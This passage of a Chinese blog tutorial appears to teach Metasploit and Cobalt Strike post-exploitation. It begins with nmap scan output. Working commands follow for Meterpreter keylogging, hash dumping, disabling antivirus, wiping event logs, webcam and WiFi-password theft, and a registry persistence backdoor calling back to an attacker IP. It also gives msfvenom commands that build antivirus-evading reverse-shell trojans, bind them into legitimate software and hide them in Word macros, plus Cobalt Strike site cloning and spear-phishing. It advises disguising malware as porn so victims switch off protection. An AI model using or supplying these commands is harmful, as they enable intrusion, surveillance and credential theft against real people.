class="line">8009/tcp open  ajp13</span><br><span class="line">8180/tcp open  unknown</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /admin/: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/index.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/login.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/admin.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/account.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/admin_login.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/home.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/admin-login.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/adminLogin.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/controlpanel.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/cp.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/index.jsp: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/login.jsp: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/admin.jsp: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/home.jsp: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/controlpanel.jsp: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/admin-login.jsp: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/cp.jsp: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/account.jsp: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/admin_login.jsp: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/adminLogin.jsp: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: </span><br><span class="line">|     JSESSIONID: </span><br><span class="line">|       httponly flag not set</span><br><span class="line">|   /admin/jscript/upload.html: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-enum: </span><br><span class="line">|   /admin/: Possible admin folder</span><br><span class="line">|   /admin/index.html: Possible admin folder</span><br><span class="line">|   /admin/login.html: Possible admin folder</span><br><span class="line">|   /admin/admin.html: Possible admin folder</span><br><span class="line">|   /admin/account.html: Possible admin folder</span><br><span class="line">|   /admin/admin_login.html: Possible admin folder</span><br><span class="line">|   /admin/home.html: Possible admin folder</span><br><span class="line">|   /admin/admin-login.html: Possible admin folder</span><br><span class="line">|   /admin/adminLogin.html: Possible admin folder</span><br><span class="line">|   /admin/controlpanel.html: Possible admin folder</span><br><span class="line">|   /admin/cp.html: Possible admin folder</span><br><span class="line">|   /admin/index.jsp: Possible admin folder</span><br><span class="line">|   /admin/login.jsp: Possible admin folder</span><br><span class="line">|   /admin/admin.jsp: Possible admin folder</span><br><span class="line">|   /admin/home.jsp: Possible admin folder</span><br><span class="line">|   /admin/controlpanel.jsp: Possible admin folder</span><br><span class="line">|   /admin/admin-login.jsp: Possible admin folder</span><br><span class="line">|   /admin/cp.jsp: Possible admin folder</span><br><span class="line">|   /admin/account.jsp: Possible admin folder</span><br><span class="line">|   /admin/admin_login.jsp: Possible admin folder</span><br><span class="line">|   /admin/adminLogin.jsp: Possible admin folder</span><br><span class="line">|   /manager/html/upload: Apache Tomcat (401 Unauthorized)</span><br><span class="line">|   /manager/html: Apache Tomcat (401 Unauthorized)</span><br><span class="line">|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload</span><br><span class="line">|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload</span><br><span class="line">|   /admin/jscript/upload.html: Lizard Cart/Remote File upload</span><br><span class="line">|_  /webdav/: Potentially interesting folder</span><br><span class="line">MAC Address: 00:0C:29:3B:4C:26 (VMware)</span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: false</span><br><span class="line">|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 329.63 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接下来就是对漏洞进行相应利用，量太多，不做赘述</p>
+<h2 id="五、Meterpreter"><a href="#五、Meterpreter" class="headerlink" title="五、Meterpreter"></a>五、Meterpreter</h2><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道</p>
+<p>使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕捉按键信息、清楚应用程序、显示、远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。</p>
+<h3 id="Meterpreter常用命令"><a href="#Meterpreter常用命令" class="headerlink" title="Meterpreter常用命令"></a>Meterpreter常用命令</h3><ul>
+<li><p><strong>background：</strong>简写为bg，返回，把meterpreter后台挂起</p>
+</li>
+<li><p><strong>sessions：</strong>查看当前建立的会话</p>
+<ul>
+<li><code>session -i [对应id]</code>可以回到对应的后台进程</li>
+<li><code>session -k [对应id]</code>结束进程（-K结束全部进程）</li>
+</ul>
+</li>
+<li><p><strong>quit</strong>：退出会话</p>
+</li>
+<li><p><strong>ps</strong>：查看进程</p>
+</li>
+<li><p><strong>getpid</strong>：查看当前进程号</p>
+</li>
+<li><p><strong>sysinfo</strong>：查看系统信息</p>
+</li>
+<li><p><strong>getsystem</strong>：自动提权</p>
+</li>
+<li><p><strong>shutdown</strong>：关机</p>
+</li>
+<li><p><strong>reboot</strong>：重启</p>
+</li>
+<li><p><strong>netstat</strong>：查看网络连接情况</p>
+</li>
+<li><p><strong>getuid</strong>：查看当前权限</p>
+</li>
+<li><p><strong>访问文件系统</strong>：cd、cat、rm、edit（与linux命令差不多）</p>
+</li>
+<li><p><strong>screenshot</strong>：屏幕截图</p>
+</li>
+<li><p><strong>键盘记录</strong>：keyscan_start、keyscan_dump、keyscan_stop</p>
+</li>
+<li><p><strong>migrate</strong>：migrate [其他进程id]，将meterpreter进程迁移到其他进程，例如系统进程，实现会话的稳定</p>
+<p>也可与keyscan配合使用，例如：将进程迁移至winlogon.exe，再keyscan_start，即可监听登录输入内容</p>
+</li>
+<li><p><strong>shell</strong>：进入目标shell界面，用exit退出</p>
+</li>
+<li><p><strong>arp</strong>：列出目标系统的 ARP 缓存表，其中包括 IP 地址、MAC 地址以及接口信息</p>
+</li>
+<li><p><strong>idletime</strong>： 目标服务器空闲时间，用于判断是否有人正在使用</p>
+</li>
+<li><p><strong>clearev</strong>：清除事件日志</p>
+</li>
+<li><p><strong>run &#x2F; bgrun</strong>：运行meterpreter的脚本，bgrun是后台运行</p>
+<ul>
+<li><strong>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</strong>：查看目标主机安装了哪些应用</li>
+<li><strong>run vnc</strong>：屏幕监控</li>
+<li><strong>run killav</strong>：杀死杀毒软件</li>
+<li><strong>run post&#x2F;windows&#x2F;gather&#x2F;enum_computers</strong>：用于枚举域内所有用户</li>
+<li><strong>run persistence</strong>：我们知道Meterpreter的强大之处之一在于它运行于内存中，不易被杀毒软件发现，但只要目标机环境合适，或你对自己的免杀足够自信，可通过该命令写入硬盘，下次目标机启动时，木马将会自启动</li>
+<li>**run scraper **：获取目标主机的详细信息（获取到的文件保存在<code>~/.msf4/logs/scripts/scraper/</code>路径下）</li>
+<li><strong>run post&#x2F;multi&#x2F;gather&#x2F;wlan_geolocate</strong>：基于wlan进行地理位置确认，最终loot文件夹在<code>/root/.msf4/loot</code>，如果通过该模块获得了地理信息，会在该文件夹下生成txt文件。注意下路径重点msf4，保不准明天就变成msf5了，是隐藏文件，看文件夹记得勾隐藏文件，命令行查看记得加-a</li>
+<li><strong>run hashdump</strong>：获取目标系统用户密码hash，该脚本需要系统用户system权限</li>
+<li><strong>run service_manager</strong>：目标系统服务管理，它还有属于自己的参数，一般用于信息收集常会用到<code>-l</code>参数</li>
+<li><strong>run post&#x2F;windows&#x2F;wlan&#x2F;wlan_profile</strong>：用于读取目标主机WiFi密码</li>
+<li><strong>run sound_recorder</strong>：声音记录</li>
+<li><strong>run webcam</strong>：开启摄像头</li>
+</ul>
+</li>
+</ul>
+<h3 id="权限维持-生成持续性后门"><a href="#权限维持-生成持续性后门" class="headerlink" title="权限维持-生成持续性后门"></a>权限维持-生成持续性后门</h3><p>因为 meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。我们又不能每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机</p>
+<h4 id="Persistence后门-写入注册表"><a href="#Persistence后门-写入注册表" class="headerlink" title="Persistence后门-写入注册表"></a>Persistence后门-写入注册表</h4><p>可以再msfconsole中使用<code>exploit/windows/local/persistence</code>模块：</p>
+<ul>
+<li>设置session</li>
+<li>设置startup（尽量选高权限如system）</li>
+<li>run</li>
+</ul>
+<p>有点小麻烦，可以直接在meterpreter中创建persistence后门：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -S -U -X -i 5 -p 8888 -r 192.168.111.132</span><br></pre></td></tr></table></figure>
+
+<p>其中persistence的选项如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-A 自动启动一个匹配的漏洞/多/处理程序来连接到代理</span><br><span class="line">-L如果不使用%TEMP%，则选择目标主机中写入有效负载的&gt;位置。</span><br><span class="line">-P 有效载荷使用，默认是windows/meterpreter/reverse_tcp。</span><br><span class="line">-S在启动时自动启动代理作为服务(具有系统特权)</span><br><span class="line">-T 选择要使用的可执行模板</span><br><span class="line">-U用户登录时自动启动代理</span><br><span class="line">-X在系统启动时自动启动代理</span><br><span class="line">-h这个帮助菜单</span><br><span class="line">-i每次连接尝试之间的间隔(以秒为单位)</span><br><span class="line">-p 运行Metasploit的系统正在监听的端口</span><br><span class="line">-r 运行Metasploit的系统的IP监听连接返回</span><br></pre></td></tr></table></figure>
+
+<p>写入之后用<code>multi/handler</code>模块设置监听即可</p>
+<h2 id="六、客户端渗透（钓鱼）"><a href="#六、客户端渗透（钓鱼）" class="headerlink" title="六、客户端渗透（钓鱼）"></a>六、客户端渗透（钓鱼）</h2><h3 id="客户端渗透原理"><a href="#客户端渗透原理" class="headerlink" title="客户端渗透原理"></a>客户端渗透原理</h3><p>在我们在无法突破对方的网络边界的时候，往往需要使用客户端渗透这种方式对目标发起攻击，比如我们向目标发一个含有后门的程序，或者是一个word文档、pdf文件。</p>
+<p>客户端渗透技巧，通常用户的计算机都安装了安全软件，一般我们生成的恶意程序都会被检测，所以我们所设计的恶意软件可以利用人的劣根性，比如我们将恶意软件或网站伪装成H色软件或网站，这样目标会认为他本身就是不好的软件被安全软件检测是很正常的事情，如果他安耐不住关闭安全防护软件执意要运行恶意程序，那么他就中招了</p>
+<h3 id="制作Windows恶意软件"><a href="#制作Windows恶意软件" class="headerlink" title="制作Windows恶意软件"></a>制作Windows恶意软件</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><p>msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行，在本地监听上线：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 10 -f exe - o /var/www/html/vip.exe</span><br><span class="line"></span><br><span class="line"># 这里是msf5，如果是msf6应该为windows/meterpreter_reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>简单分析一下选项：</p>
+<ul>
+<li>-a windows位数</li>
+<li>–platform 操作系统</li>
+<li>-p payload</li>
+<li>-b 去除坏字符 \x00</li>
+<li>-e 指定编码器（本意用于免杀，但效果不太行了）</li>
+<li>-i 编码次数</li>
+<li>-f 生成程序类型</li>
+<li>-o 生成位置</li>
+</ul>
+<p>可以尝试两种编码减少杀软识别率：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f exe - o /var/www/html/vip.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="给应用软件加上后门"><a href="#给应用软件加上后门" class="headerlink" title="给应用软件加上后门"></a>给应用软件加上后门</h4><p>避免影响原程序运行，可以不给主程序上后门，将马子绑定到关联运行的程序即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 -b&quot;\x00&quot; -e x86/shikata_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /var/www/html/QvodTerminal.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-x 以某程序为模板</li>
+</ul>
+<h3 id="制作Linux恶意软件"><a href="#制作Linux恶意软件" class="headerlink" title="制作Linux恶意软件"></a>制作Linux恶意软件</h3><p>同理，换了个平台而已：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.111.132 LPORT=7890 -f elf &gt; mshell.elf</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用宏感染word文档"><a href="#利用宏感染word文档" class="headerlink" title="利用宏感染word文档"></a>利用宏感染word文档</h3><p>前提是用户的office开启了宏</p>
+<p>生成宏和payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p</span><br><span class="line">windows/meterpreter/reverse_tcp LHOST=192.168.60.128</span><br><span class="line">LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe</span><br></pre></td></tr></table></figure>
+
+<p>将生成的宏代码粘贴到word的宏里面，保存为启用宏的文档</p>
+<p>将生成的payload放到文档内容中，字体调成白色进行隐藏</p>
+<h1 id="CoBalt-Strike（CS）"><a href="#CoBalt-Strike（CS）" class="headerlink" title="CoBalt Strike（CS）"></a>CoBalt Strike（CS）</h1><p>CobaltStrike是一款美国RedTeam开发的渗透测试神器，常被业界人称为CS。它是一款以Metasploit为基础的<strong>GUI的框架式渗透工具</strong>，集成了端口转发、服务扫描、自动化溢出、多模式端口监听、Winexe木马生成、Windll木马生成、Java木马生成、office宏病毒生成、木马捆绑等；钓鱼攻击包括：站点克隆、目标信息获取、Java执行、浏览器自动攻击等</p>
+<p>官方地址：<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a></p>
+<p>github下载地址：<a target="_blank" rel="noopener" href="https://github.com/zer0yu/Awesome-CobaltStrike">https://github.com/zer0yu/Awesome-CobaltStrike</a></p>
+<p>我下的应该是这个版本，好久没有更新了的</p>
+<h2 id="CS介绍"><a href="#CS介绍" class="headerlink" title="CS介绍"></a>CS介绍</h2><p>CobaltStrike分为服务端和客户端</p>
+<p>服务端可以部署在远程服务器下或者部署在kaili里</p>
+<p>客户端可以部署到本地支持linux和windows系统</p>
+<p>CS的一大特色是支持多人运动🥵，集体上线分工合作：</p>
+<h2 id="二、CS服务器与客户端"><a href="#二、CS服务器与客户端" class="headerlink" title="二、CS服务器与客户端"></a>二、CS服务器与客户端</h2><h4 id="服务端启动"><a href="#服务端启动" class="headerlink" title="服务端启动"></a>服务端启动</h4><p>服务端尽量部署在linux中</p>
+<p>打开root终端进入CS目录</p>
+<p>在终端中输入：.&#x2F;teamserverIP密码</p>
+<p>我们这里这样，首先得有这个server源文件，然后zip下，复制，再到kali桌面点击paste</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# ls</span><br><span class="line"> 1.txt</span><br><span class="line"> 9027.ovpn</span><br><span class="line"> Server.zip</span><br><span class="line"> WebSocketReflectorX-0.4.3-linux-gnu-x86_64.AppImage</span><br><span class="line"> index.php.swp</span><br><span class="line"> req.txt</span><br><span class="line"> wordlist</span><br><span class="line">&#x27;&#x27;$&#x27;\346\234\200\347\256\200\345\215\225\347\232\204&#x27;&#x27;SSH&#x27;$&#x27;\344\270\216\344\274\240\346\226\207\344\273\266&#x27;&#x27;.md&#x27;</span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# </span><br></pre></td></tr></table></figure>
+
+<p>然后大概就是这样</p>
+<p>再具体解压到哪里就是看自己的习惯了，再不懂的问ai就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# mkdimkdir -pt/cs</span><br><span class="line">unzip /root/Desktop/Server.zip -d /opt/cs</span><br><span class="line">Archive:  /root/Desktop/Server.zip</span><br><span class="line">  inflating: /opt/cs/cobaltstrike.auth  </span><br><span class="line">  inflating: /opt/cs/source-common.sh  </span><br><span class="line">  inflating: /opt/cs/teamserver      </span><br><span class="line">  inflating: /opt/cs/TeamServerImage  </span><br><span class="line">   creating: /opt/cs/third-party/</span><br><span class="line">  inflating: /opt/cs/third-party/README.winvnc.txt  </span><br><span class="line">  inflating: /opt/cs/third-party/winvnc.x64.dll  </span><br><span class="line">  inflating: /opt/cs/third-party/winvnc.x64.dll.lnk  </span><br><span class="line">  inflating: /opt/cs/third-party/winvnc.x86.dll  </span><br><span class="line">  inflating: /opt/cs/third-party/winvnc.x86.dll.lnk  </span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# find /opt/cs -type f -name teamserver</span><br><span class="line">/opt/cs/teamserver</span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第一次启动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/cs</span><br><span class="line">chmod +x teamserver TeamServerImage</span><br><span class="line">hostname -I</span><br></pre></td></tr></table></figure>
+<p>以后的启动命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/cs</span><br><span class="line">./teamserver 192.168.220.128 &#x27;520520&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这个密码是等win来连接用的</p>
+<p>然后CS客户端如下</p>
+<p><img loading="lazy" decoding="async" src="https://github.com/web-wuk0Ng/my-images/blob/main/2026/10/ScreenShot_2026-10-30_200806_068.png?raw=true"></p>
+<p>可以看到能成功连接上</p>
+<p><img loading="lazy" decoding="async" src="https://github.com/web-wuk0Ng/my-images/blob/main/2026/10/ScreenShot_2026-10-30_200957_361.png?raw=true"></p>
+<h4 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h4><p>Cobaltstrike客户端在Windows、Linux、Mac下都可以运行 (需要配置好Java环境)。</p>
+<p>启动CobaltStrike客户端，输入服务端的IP以及端口、连接密码，用户名可以任意设置</p>
+<p>这个我是很久很久以前大一就搞好了，再具体就忘记了，这个简单很多</p>
+<h2 id="三、CS基本功能简介"><a href="#三、CS基本功能简介" class="headerlink" title="三、CS基本功能简介"></a>三、CS基本功能简介</h2><p>界面的图标：</p>
+<p><img loading="lazy" decoding="async" src="https://github.com/web-wuk0Ng/my-images/blob/main/2026/10/ScreenShot_2026-10-30_192737_183.png?raw=true"></p>
+<p>其他功能选项的都有文字，不做赘述</p>
+<h4 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h4><p>Cobaltstrike提供了多种监听器</p>
+<p>beacon_xx系列为CobaltStrike自身内置的监听器，即在目标主机执行相应的payload，获取shell到CS上，包括dns、http、https、smb、tcp等方式的监听器；</p>
+<p>foreign系列为外部监听器，通常与MSF联动，例如获取meterpreter到MSF上</p>
+<h4 id="beacon常用命令"><a href="#beacon常用命令" class="headerlink" title="beacon常用命令"></a>beacon常用命令</h4><p>右键上线的主机，点击interact进入beacon命令行</p>
+<ul>
+<li>记得调整一下心跳间隔：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sleep 3</span><br><span class="line"></span><br><span class="line">#打靶机直接sleep 0即可，实战不建议过快，流量会异常</span><br></pre></td></tr></table></figure>
+
+<p>执行系统命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell [系统命令]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>beacon自身命令：</p>
+<p>命令很多，可以用help查看详细解释，很多命令基本都可以依靠图形化界面完成</p>
+</li>
+</ul>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>功能点位于<code>Attacks -&gt; web Drive-by -&gt; System Profiler</code></p>
+<p>原理就是挂了个系统代理，然后我们访问目标网站，CS进行被动扫描，个人觉得不如用其他专门的漏扫器</p>
+<h4 id="网站克隆"><a href="#网站克隆" class="headerlink" title="网站克隆"></a>网站克隆</h4><p>这是一个挺有趣的功能，可以用于简单的社工、钓鱼</p>
+<p>功能点位于<code>Attacks -&gt; web Drive-by -&gt; Clone Site</code></p>
+<p>似乎只能克隆http</p>
+<p>比如克隆百度，我们就这样（这里可以把最下面的键盘记录勾上）：</p>
+<p><img loading="lazy" decoding="async" src="https://github.com/web-wuk0Ng/my-images/blob/main/2026/10/ScreenShot_2026-10-30_193153_742.png?raw=true"></p>
+<p>可以看见直接就克隆了，非常完美：</p>
+<p><img loading="lazy" decoding="async" src="https://github.com/web-wuk0Ng/my-images/blob/main/2026/10/ScreenShot_2026-10-30_193249_154.png?raw=true"></p>
+<p>接下来将ip拿去生成一个短链接，就比较具有迷惑性了</p>
+<h4 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h4><p>功能点位于<code>Attacks -&gt; Spear Phish</code></p>
+<p>如图：该模块有6个需要自定义的内容：</p>
+<ul>
+<li>目标</li>
+<li>模板</li>
+<li>附件</li>
+<li>嵌入URL</li>
+<li>邮件服务器</li>
+<li>退信通知邮箱</li>
+</ul>
+<h1 id="MSF-CS联动"><a href="#MSF-CS联动" class="headerlink" title="MSF&amp;CS联动"></a>MSF&amp;CS联动</h1><p>这里就先不搞了，等后面还会打靶啥的再搞，过程还是不难的</p>
+<h2 id="一、Cobalt-Strike传递会话到MSF"><a href="#一、Cobalt-Strike传递会话到MSF" class="headerlink" title="一、Cobalt Strike传递会话到MSF"></a>一、Cobalt Strike传递会话到MSF</h2><h2 id="二、MSF传递会话到Cobalt-Strike"><a href="#二、MSF传递会话到Cobalt-Strike" class="headerlink" title="二、MSF传递会话到Cobalt Strike"></a>二、MSF传递会话到Cobalt Strike</h2>
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">wuk0Ng</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://web-wuk0ng.github.io/2026/10/30/MSF&CS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/">https://web-wuk0ng.github.io/2026/10/30/MSF&CS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">wuk0Ng</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                                    <span class="chip bg-color">红队</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91/">
+                                    <span class="chip bg-color">内网</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 42px 0 22px;
+        text-align: center;
+    }
+
+    #reward .reward-open {
+        width: 52px;
+        height: 52px;
+        padding: 0;
+        color: #fff;
+        font-size: 1.35rem;
+        line-height: 52px;
+        cursor: pointer;
+        border: 0;
+        border-radius: 50%;
+        background: #ef5350;
+        box-shadow: 0 5px 16px rgba(239, 83, 80, 0.3);
+        transition: transform 160ms ease, box-shadow 160ms ease;
+    }
+
+    #reward .reward-open:hover,
+    #reward .reward-open:focus-visible {
+        background: #ef5350;
+        box-shadow: 0 8px 22px rgba(239, 83, 80, 0.38);
+        transform: translateY(-2px);
+    }
+
+    .reward-dialog[hidden] {
+        display: none !important;
+    }
+
+    .reward-dialog {
+        position: fixed;
+        z-index: 10020;
+        inset: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 18px;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 180ms ease, visibility 180ms ease;
+    }
+
+    .reward-dialog.is-open {
+        opacity: 1;
+        visibility: visible;
+    }
+
+    .reward-dialog-backdrop {
+        position: absolute;
